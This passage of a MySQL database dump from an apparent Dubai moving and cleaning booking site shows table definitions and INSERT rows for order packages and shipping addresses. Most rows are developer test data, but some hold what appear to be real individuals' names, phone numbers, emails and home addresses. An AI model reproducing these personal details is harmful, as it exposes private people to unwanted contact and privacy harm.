(96, 87, 35, 45, '5 BR Villa | Premium', 1, 5780, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '5-br-villa-premium', 'no-image.png', NULL, 2, '2024-06-11', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(97, 87, 35, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-11', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(98, 88, 19, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-14', 0, 0, 0, '2', '3', 'Multiple times a week', 'yes', 'sfs', 'home', 'Dubai', 'sfs', 'sfs', 'sfs', '17', 'June', '2024', '6:00 PM - 6:30 PM', 'Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday'),
(99, 89, 19, NULL, NULL, NULL, NULL, 45, NULL, 29, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-14', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, 'home', 'Abu Dhabhi', 'area', 'sfas', 'asfas', '19', 'June', '2024', '5:00 PM - 5:30 PM', ''),
(100, 90, 16, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-14', 0, 0, 0, '1', '3', 'Weekly', 'yes', NULL, 'home', 'Dubai', 'm', 'm', 'm', '14', 'June', '2024', '1:00 PM - 1:30 PM', ''),
(101, 91, 36, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-15', 0, 0, 0, '1', '3', 'Once', 'yes', NULL, 'home', 'Dubai', 'Dubai', 'Dubai', 'G02', '17', 'June', '2024', '8:00 AM - 8:30 AM', ''),
(102, 92, 37, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-16', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(103, 93, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(104, 94, 19, NULL, NULL, NULL, NULL, 45, NULL, 29, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, 'home', 'Dubai', 'test area', 'Dev', '12', '24', 'June', '2024', '8:00 AM - 8:30 AM', '');

-- --------------------------------------------------------

--
-- Table structure for table `ci_order_item_packages`
--

CREATE TABLE `ci_order_item_packages` (
  `id` int(11) NOT NULL,
  `order_id` int(11) DEFAULT NULL,
  `order_item_id` int(11) DEFAULT NULL,
  `user_info_id` int(11) DEFAULT NULL,
  `package_id` int(11) DEFAULT NULL,
  `package_item_name` varchar(255) DEFAULT NULL,
  `package_quantity` int(11) DEFAULT NULL,
  `package_item_price` varchar(255) DEFAULT NULL,
  `service_id` int(11) DEFAULT NULL,
  `service_name` varchar(255) DEFAULT NULL,
  `subservice_id` int(11) DEFAULT NULL,
  `subservice_name` varchar(255) DEFAULT NULL,
  `packagecategory_id` int(11) DEFAULT NULL,
  `packagecategory_name` varchar(255) DEFAULT NULL,
  `page_url` varchar(255) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `discount` varchar(255) DEFAULT NULL,
  `discount_type` varchar(255) DEFAULT NULL,
  `product_discount_amount` varchar(255) DEFAULT NULL,
  `cdate` varchar(255) DEFAULT NULL,
  `subservice_booking_percentage` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `ci_order_item_packages`
--

INSERT INTO `ci_order_item_packages` (`id`, `order_id`, `order_item_id`, `user_info_id`, `package_id`, `package_item_name`, `package_quantity`, `package_item_price`, `service_id`, `service_name`, `subservice_id`, `subservice_name`, `packagecategory_id`, `packagecategory_name`, `page_url`, `image`, `discount`, `discount_type`, `product_discount_amount`, `cdate`, `subservice_booking_percentage`) VALUES
(1, 89, 99, 19, 46, 'Studio', 1, '299', 45, 'Cleaning', 29, 'Deep Cleaning', 45, 'Apartment', 'studio', 'no-image.png', NULL, '2', '0', '2024-06-14', '20'),
(2, 89, 99, 19, 54, '4 Bedroom Villa', 1, '1299', 45, 'Cleaning', 29, 'Deep Cleaning', 45, 'Villa', '4-bedroom-villa', 'no-image.png', NULL, '2', '0', '2024-06-14', '20'),
(3, 94, 104, 19, 46, 'Studio', 1, '299', 45, 'Cleaning', 29, 'Deep Cleaning', 45, 'Apartment', 'studio', 'no-image.png', NULL, '2', '0', '2024-06-18', '20');

-- --------------------------------------------------------

--
-- Table structure for table `ci_shipping_address`
--

CREATE TABLE `ci_shipping_address` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `order_id` int(11) NOT NULL,
  `first_name` varchar(255) NOT NULL,
  `last_name` varchar(255) NOT NULL,
  `company` varchar(255) DEFAULT NULL,
  `address1` text,
  `address2` text,
  `city` varchar(255) DEFAULT NULL,
  `post_code` varchar(255) DEFAULT NULL,
  `country` varchar(255) NOT NULL,
  `state` varchar(255) DEFAULT NULL,
  `phone_number` varchar(255) NOT NULL,
  `email_address` varchar(255) NOT NULL,
  `bill_first_name` varchar(255) DEFAULT NULL,
  `bill_last_name` varchar(255) DEFAULT NULL,
  `bill_company` varchar(255) DEFAULT NULL,
  `bill_address1` text,
  `bill_address2` text,
  `bill_city` varchar(255) DEFAULT NULL,
  `bill_post_code` varchar(255) DEFAULT NULL,
  `bill_country` varchar(255) DEFAULT NULL,
  `bill_state` varchar(255) DEFAULT NULL,
  `bill_phone_number` varchar(255) DEFAULT NULL,
  `bill_email_address` varchar(255) DEFAULT NULL,
  `additional_message` text,
  `payment_method` varchar(255) NOT NULL,
  `zipcode` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 ROW_FORMAT=COMPACT;

--
-- Dumping data for table `ci_shipping_address`
--

INSERT INTO `ci_shipping_address` (`id`, `user_id`, `order_id`, `first_name`, `last_name`, `company`, `address1`, `address2`, `city`, `post_code`, `country`, `state`, `phone_number`, `email_address`, `bill_first_name`, `bill_last_name`, `bill_company`, `bill_address1`, `bill_address2`, `bill_city`, `bill_post_code`, `bill_country`, `bill_state`, `bill_phone_number`, `bill_email_address`, `additional_message`, `payment_method`, `zipcode`) VALUES
(1, 5, 1, 'dev', 'tretiya', NULL, 'Brahmpole street', 'test', '2', NULL, '5', '3', '9033359413', 'dev@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'add', '1', '382775'),
(2, 12, 2, 'abd', 'villiyers', NULL, '123', '123', '15', NULL, '22', '21', '1231234', 'abd@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '123', '1', '123123'),
(3, 12, 3, 'abd', 'Villiyers', NULL, '123', '123', '15', NULL, '22', '21', '1234567', 'abd@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '123', '1', '123'),
(4, 13, 4, 'asmit', 'ka', NULL, 'asa', NULL, '15', NULL, '22', '21', '9920651001', 'asmit@digitalsadhus.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', 'ff'),
(5, 5, 5, 'dev patel', 'patel', NULL, 'Brahmpole street', 'test', '15', NULL, '22', '21', '9033359413', 'dev@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', '382775'),
(6, 5, 6, 'dev patel', 'tretiya', NULL, 'Brahmpole street', 'test', '15', NULL, '22', '21', '9033359413', 'dev@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', '382775'),
(7, 5, 7, 'dev', 'patel', NULL, 'Brahmpole street', 'test', '15', NULL, '22', '21', '9033359413', 'dev@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', '382775'),
(8, 5, 8, 'dev', 'patel', NULL, 'Brahmpole street', 'test', '15', NULL, '22', '21', '9033359413', 'dev@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Additional notes', '1', '382775'),
(9, 17, 9, 'nik', 'patel', NULL, '123', '132', '16', NULL, '22', '22', '1324567', 'nik@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', '1234567'),
(10, 18, 10, 'venkey', 'devevndra', NULL, '123', '123', '16', NULL, '22', '22', '1231234', 'ventes@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'test', '1', '123'),
(11, 18, 13, 'ventesh', 'devendra', NULL, NULL, NULL, NULL, NULL, '22', NULL, '1234567', 'venteshd@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(12, 18, 14, 'venteshhhhhh', 'dddddddd', NULL, NULL, NULL, NULL, NULL, '22', NULL, '1234567', 'ventesh@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(13, 16, 15, 'Suhaan', 'Mukadam', NULL, 'Bulding6A, Road J', 'Apartment', NULL, NULL, '22', NULL, '0585200722', 'suhaanmukadam007@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(14, 20, 16, 'adarsh', 'patel', NULL, '123', '123', NULL, NULL, '22', NULL, '1231234', 'adars@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'test', '1', NULL),
(15, 21, 17, 'Suhaan', '1', NULL, '1', '1', NULL, NULL, '22', NULL, '0585200722', 'suhaanmukadam16@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(16, 19, 18, 'hitesh', 'bhai', NULL, '123', 'Test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Test', '1', NULL),
(17, 19, 19, 'hitesh', 'Rathod', NULL, '123', '321', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Test', '1', NULL),
(18, 19, 20, 'Mayudin', 'Chauhan', NULL, '12', 'Test', '18', NULL, '23', '24', '9033259413', 'mayudin.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Trest', '1', '382775'),
(19, 19, 21, 'mayudin', 'Chauhan', NULL, '123', '321', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Test', '1', NULL),
(20, 19, 22, 'Mayudin', 'Chauhan', NULL, '123', '321', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Test', '1', NULL),
(21, 19, 23, 'hitesh', 'patel', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(22, 19, 24, 'hitesh', 'test', NULL, '123', '321', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Testr', '1', NULL),
(23, 19, 25, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(24, 19, 26, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(25, 19, 27, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(26, 19, 28, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(27, 19, 29, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(28, 19, 30, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(29, 19, 31, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(30, 19, 32, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(31, 19, 33, 'hitesh', 'dev', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(32, 19, 34, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(33, 19, 35, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(34, 19, 36, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(35, 19, 37, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(36, 19, 38, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(37, 19, 39, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(38, 19, 40, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(39, 19, 41, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(40, 19, 42, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(41, 19, 43, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(42, 19, 44, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(43, 25, 45, 'asmit', 'sadhu', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '1234567890', 'asmit@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(44, 10, 46, 'Nikul', 'Patel', NULL, 'test', 'MJ Apartsments', NULL, NULL, '22', NULL, '8097517477', 'patelnikul321@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(45, 10, 47, 'Nikul', 'Patel', NULL, '1098 Main St', 'MJ Apartsments', NULL, NULL, '22', NULL, '8097517477', 'patelnikul321@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(46, 19, 48, 'hitesh', 'rathod', NULL, 'Test', 'Test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(47, 19, 49, 'hitesh', 'rathod', NULL, 'Test', 'Test 23', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(48, 19, 50, 'hitesh', 'rathod', NULL, 'Test', 'tets', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(49, 19, 51, 'hitesh', 'rathod', NULL, 'Test', 'Test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(50, 10, 52, 'Nikul', 'Patel', NULL, '1098 Main St', 'MJ Apartsments', NULL, NULL, '22', NULL, '8097517477', 'patelnikul321@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(51, 19, 53, 'hitesh', 'Test', NULL, 'Test', 'Test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(52, 19, 54, 'hitesh', 'Test', NULL, 'Test', 'Test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(53, 6, 55, 'mayudin', 'Chauhan', NULL, 'Test', 'Test', NULL, NULL, '22', NULL, '7990739286', 'mayudin.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Test Msg', '1', NULL),
(54, 6, 56, 'mayudin', 'Chauhan', NULL, '123', '123', NULL, NULL, '22', NULL, '7990739286', 'mayudin.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '123', '1', NULL),
(55, 16, 57, 'Suhaan', 'Mukadam', NULL, 'Building 6 Block A, Road J, Layan', 'G02', NULL, NULL, '22', NULL, '0585200722', 'suhaanmukadam007@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(56, 19, 58, 'hitesh', 'patel', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(57, 16, 59, 'Suhaan', 'Mukadam', NULL, 'Building 6 Block A, Road J, Layan', 'G02', NULL, NULL, '22', NULL, '585200722', 'suhaanmukadam007@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(58, 16, 60, 'Suhaan', 'Mukadam', NULL, 'Building 6 Block A, Road J, Layan', 'G02', NULL, NULL, '22', NULL, '0585200722', 'suhaanmukadam007@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
(59, 19, 61, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(60, 19, 62, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(61, 31, 63, 'Abhishek', 'Patadiya', NULL, '12', 'villa', NULL, NULL, '22', NULL, '1234567890', 'abhishek.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(62, 16, 64, 'Suhaan', 'm', NULL, 'm', 'm', NULL, NULL, '22', NULL, '585200691', 'suhaanmukadam007@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(63, 32, 65, 'Zafar', 'Mukadam', NULL, 'Layan', 'G02', NULL, NULL, '22', NULL, '0508807610', 'zafar@quickserverelo.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(64, 32, 66, 'ZAFFAR', 'MUKADAM', NULL, 'dubai', '2', '17', NULL, '22', '23', '0508007610', 'zafar.mukadam@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(65, 32, 67, 'ZAFFAR', 'MUKADAM', NULL, 'dubai', '2', '17', NULL, '22', '23', '0508007610', 'zafar.mukadam@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(66, 33, 68, 'test', 'test', NULL, 'test', 'test', NULL, NULL, '27', NULL, '1234678905', 'abhishek.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', '12345'),
(67, 19, 69, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(68, 33, 70, 'test', 'test', NULL, 'test', 'test', NULL, NULL, '22', NULL, '1234678905', 'abhishek.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(69, 32, 71, 'ZAFFAR', 'MUKADAM', NULL, 'test', 'test', NULL, NULL, '246', NULL, '0508007610', 'ZAFAR@QUICKSERVERELO.COM', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', '910'),
(70, 32, 72, 'ZAFFAR', 'MUKADAM', NULL, 'test', 'test', NULL, NULL, '246', NULL, '0508007610', 'ZAFAR@QUICKSERVERELO.COM', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', '910'),
(71, 33, 73, 'Abhishek', 'tesr', NULL, '3', '3', 'Surendranagar', NULL, '190', NULL, '1234678905', 'abhishek.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'test', '1', '123456'),
(72, 19, 74, 'hitesh', 'tretiya', NULL, 'Brahmpole street', 'test', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(73, 19, 80, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(74, 19, 75, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(75, 19, 76, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(76, 19, 77, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(77, 19, 78, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(78, 19, 79, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(79, 19, 81, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(80, 19, 82, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(81, 19, 83, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(82, 35, 84, 'krishnna', 'suhaan', NULL, '123 house name', '123 house name', '123 house name', NULL, '22', NULL, '1234567890', 'krishnna.work@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(83, 35, 85, 'krishnna', 'suhaan', NULL, '123 house name', '123 house name', '123 house name', NULL, '22', NULL, '1234567890', 'krishnna.work@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(84, 35, 86, 'krishnna', 'suhaan', NULL, '123 house name', '123 house name', '123 house name', NULL, '22', NULL, '1234567890', 'krishnna.work@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(85, 35, 87, 'krishnna', 'suhaan', NULL, '123 house name', '123 house name', '123 house name', NULL, '22', NULL, '1234567890', 'krishnna.work@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(86, 19, 88, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(87, 19, 89, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(88, 16, 90, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(89, 36, 91, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', ''),
(90, 37, 92, 'Suhaan Mukadam', 'n', NULL, 'a', 'a', NULL, NULL, '22', NULL, '0595939393', 'suhaan@vendorscity.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2', NULL),
